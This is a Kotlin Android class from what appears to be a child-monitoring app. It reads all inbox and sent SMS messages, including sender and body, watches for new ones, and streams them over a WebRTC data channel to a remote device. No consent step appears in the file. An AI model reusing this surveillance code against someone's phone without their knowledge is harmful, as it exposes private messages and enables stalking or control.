package com.soumo.child.sms

import android.annotation.SuppressLint
import android.content.Context
import android.database.Cursor
import androidx.core.net.toUri
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.webrtc.DataChannel
import org.json.JSONObject
import java.nio.ByteBuffer
import android.content.SharedPreferences
import android.database.ContentObserver

class SmsSharing(
    private val context: Context,
    private val dataChannel: DataChannel
) {

    private val handler = Handler(Looper.getMainLooper())
    private val sentTimestamps = mutableSetOf<Long>()
    private var lastSentTimestamp: Long = 0L // In-memory only, resets on new connection
    private var smsObserver: ContentObserver? = null

    @SuppressLint("UseKtx")
    fun startSharing() {
        Log.d(TAG, "Starting SMS sharing...")
        sendLatestSms()
        // Register observer for new SMS
        if (smsObserver == null) {
            smsObserver = object : ContentObserver(handler) {
                override fun onChange(selfChange: Boolean) {
                    super.onChange(selfChange)
                    Log.d(TAG, "SMS content changed, checking for new SMS...")
                    sendLatestSms()
                }
            }
            context.contentResolver.registerContentObserver(
                "content://sms/".toUri(),
                true,
                smsObserver!!
            )
        }
    }

    private fun sendLatestSms() {
        var maxTimestamp = lastSentTimestamp
        val uri = "content://sms/".toUri()
        val selection = if (lastSentTimestamp > 0L) "date > ?" else null
        val selectionArgs = if (lastSentTimestamp > 0L) arrayOf(lastSentTimestamp.toString()) else null
        val cursor: Cursor? = try {
            context.contentResolver.query(uri, null, selection, selectionArgs, "date DESC")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to query SMS content provider", e)
            null
        }
        if (cursor == null) {
            Log.w(TAG, "Cursor is null. No SMS retrieved.")
            return
        }
        try {
            val addressIdx = cursor.getColumnIndex("address")
            val bodyIdx = cursor.getColumnIndex("body")
            val dateIdx = cursor.getColumnIndex("date")
            val typeIdx = cursor.getColumnIndex("type")
            if (addressIdx == -1 || bodyIdx == -1 || dateIdx == -1 || typeIdx == -1) {
                Log.e(TAG, "One or more required columns not found in SMS cursor")
                return
            }
            var count = 0
            while (cursor.moveToNext() && count < 200) {
                val timestamp = cursor.getLong(dateIdx)
                if (sentTimestamps.contains(timestamp)) continue
                val smsJson = JSONObject().apply {
                    put("type", "sms")
                    put("timestamp", timestamp)
                    put("address", cursor.getString(addressIdx) ?: "")
                    put("body", cursor.getString(bodyIdx) ?: "")
                    put("sms_type", when (cursor.getInt(typeIdx)) {
                        1 -> "inbox"
                        2 -> "sent"
                        else -> "unknown"
                    })
                }
                sendViaDataChannel(smsJson)
                sentTimestamps.add(timestamp)
                if (timestamp > maxTimestamp) maxTimestamp = timestamp
                count++
            }
            lastSentTimestamp = maxTimestamp // Update in-memory for this connection
            Log.d(TAG, "SMS sharing completed. Sent ${sentTimestamps.size} unique messages. Latest timestamp: $maxTimestamp")
        } catch (e: Exception) {
            Log.e(TAG, "Error while sharing SMS", e)
        } finally {
            cursor.close()
        }
    }

    fun stopSharing() {
        Log.d(TAG, "Stopping SMS sharing. Clearing internal logs.")
        sentTimestamps.clear()
        // Unregister observer
        if (smsObserver != null) {
            context.contentResolver.unregisterContentObserver(smsObserver!!)
            smsObserver = null
        }
    }

    private fun sendViaDataChannel(json: JSONObject) {
        try {
            if (dataChannel.state() != DataChannel.State.OPEN) {
                Log.w(TAG, "DataChannel is not open. Skipping send.")
                return
            }

            val message = json.toString()
            val maxChunkSize = 8192
            val bytes = message.toByteArray(Charsets.UTF_8)

            for (i in bytes.indices step maxChunkSize) {
                val end = (i + maxChunkSize).coerceAtMost(bytes.size)
                val chunk = ByteBuffer.wrap(bytes, i, end - i)
                val sent = dataChannel.send(DataChannel.Buffer(chunk, false))

                if (!sent) {
                    Log.w(TAG, "Failed to send SMS chunk [$i - $end]")
                    break
                }
            }

            Log.d(TAG, "SMS sent over DataChannel (${bytes.size} bytes)")

        } catch (e: Exception) {
            Log.e(TAG, "Error sending SMS via DataChannel", e)
        }
    }

    companion object {
        private const val TAG = "SmsSharing"
    }
}
